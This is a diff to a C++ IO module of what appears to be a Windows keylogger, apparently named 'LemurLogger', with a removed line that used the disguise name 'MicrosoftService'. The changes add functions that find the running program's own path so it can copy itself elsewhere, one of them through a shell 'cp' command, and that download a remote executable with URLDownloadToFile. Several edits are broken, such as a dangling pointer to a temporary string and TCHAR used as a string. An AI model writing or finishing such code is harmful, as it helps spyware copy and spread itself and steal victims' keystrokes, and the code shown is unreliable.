@@ -9,9 +9,10 @@
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"
-//#include <Urlmon.h>
+//#include <urlmon.h>
 #include <tchar.h>
 #include <vector>
+
 
 namespace IO
 {
@@ -64,12 +65,18 @@ namespace IO
       return "";
     }
   }
+    std::string getFileNameWithPath(){
+        char szExeFileName[MAX_PATH];
+        GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        std::string::size_type pos = std::string( szExeFileName ).find_last_of( "\\/" );
+        return std::string( szExeFileName ).substr( 0, pos);
 
+    }
 
     bool copy(std::string path,std::string filename){
-        TCHAR szExeFileName[MAX_PATH] = TEXT("MicrosoftService");
+
         //get self name
-        std::string cur_path_filename;// = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        std::string cur_path_filename = getFileNameWithPath();
         //open self
         std::ifstream initialFile(cur_path_filename, std::ios::in|std::ios::binary);
         //open outfile
@@ -107,7 +114,7 @@ namespace IO
     }
 
     bool copy_w_cmd(std::string path,std::string filename){
-        std::string cur_path_filename;// = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        std::string cur_path_filename = getFileNameWithPath();
         std::string command = "cp "+cur_path_filename+" "+path+filename;
         try {
             system(command.c_str());
@@ -119,7 +126,7 @@ namespace IO
     }
 
     bool ms_Copyfile(const char * desfile_path){
-        const char * cur_path_filename;// = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        const char * cur_path_filename = getFileNameWithPath().c_str();
         if (CopyFile (cur_path_filename, desfile_path, true))
             return false;
 
@@ -128,13 +135,13 @@ namespace IO
 
     }
 
-    bool download_File(std::string urlfile,TCHAR * despath)
+    bool download_File(TCHAR urlfile,TCHAR despath)
     {
 
-        TCHAR url = urlfile.c_str();
-        TCHAR path[MAX_PATH] = despath;
+        TCHAR url = urlfile;
+        TCHAR path = despath;
         //GetCurrentDirectory(MAX_PATH, path);
-        wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
+        //wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
         //printf("Path: %S\n", path);
         HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);
         if(res == S_OK) {
